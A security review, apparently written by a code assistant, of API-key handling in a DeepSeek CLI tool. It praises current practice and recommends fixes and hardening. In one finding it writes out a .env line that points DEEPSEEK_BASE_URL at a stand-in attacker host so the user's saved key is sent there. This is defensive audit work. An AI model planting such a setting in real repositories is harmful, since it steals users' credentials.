
 Reviewed only API-key/auth handling. No changes made.

 Strong points
 - Key is never passed on the command line.
 - dsearch auth hides TTY input; docs avoid echo/shell history.
 - Unix saved key file is 0600; write is atomic-ish via temp + rename.
 - .env is gitignored; env overrides lower-priority sources.
 - Requests use the expected Authorization: Bearer … header.

 Important issue: custom base URL can exfiltrate the key
 - DEEPSEEK_BASE_URL accepts any URL, including http://, and every
   request sends the configured API key to it.
 - More seriously, a repository-controlled ./.env can set only
   DEEPSEEK_BASE_URL=https://attacker.example; loadConfig() then combines
   that with the user’s saved key and sends it to the attacker.
 - This is the main item I would fix.

 Recommended approach:
 1. Default to only https://api.deepseek.com.
 2. Do not load DEEPSEEK_BASE_URL from automatic ./.env; accept it only
    from an explicitly supplied environment variable/flag.
 3. Validate custom URLs as HTTPS (with an explicit, loudly named
    insecure-development escape hatch if local HTTP testing is
    necessary).
 4. Consider requiring an explicit --allow-custom-base-url
    acknowledgement before sending credentials to a non-DeepSeek origin.

 Storage
 - On Windows, the key remains plaintext JSON. The code notes POSIX modes
   are ignored; it does not establish or verify restrictive Windows ACLs.
 - 0600 is reasonable on Linux/macOS, but an OS credential store would be
   better:
     - macOS Keychain
     - Windows Credential Manager / DPAPI
     - Linux Secret Service / libsecret
 - Since those usually require platform-native integration/dependencies,
   keep the current file storage as an explicit fallback, with a warning
   that it is plaintext.

 Other worthwhile hardening
 - Create the config directory with 0700 on Unix, not default mkdir
   permissions.
 - Use a securely unique, exclusive temp file when saving rather than
   predictable config.json.<pid>.tmp; this reduces
   same-user/shared-directory race concerns.
 - Reject or warn on overly permissive existing config files before
   reading them, rather than silently trusting them.
 - Set fetch redirects to redirect: 'error' (or explicitly verify
   same-origin redirects) as defense in depth around credential
   forwarding.
 - Add a documented CI recommendation: inject DEEPSEEK_API_KEY from the
   CI secret manager; do not use dsearch auth or checked-in .env files in
   CI.
 - Consider an opt-in --key-file / DEEPSEEK_API_KEY_FILE for
   secret-mounted environments. It is useful for Docker/Kubernetes, but
   should require restrictive permissions and is not inherently safer
   than environment injection.

 Scope note
 DeepSeek’s documented API auth is bearer API keys, so OAuth/mTLS are not
 alternatives this CLI can independently add unless DeepSeek supports
 them.

 Priority order: fix .env + custom base-URL credential exfiltration
 first, then offer OS keychain storage.                                                                                                                              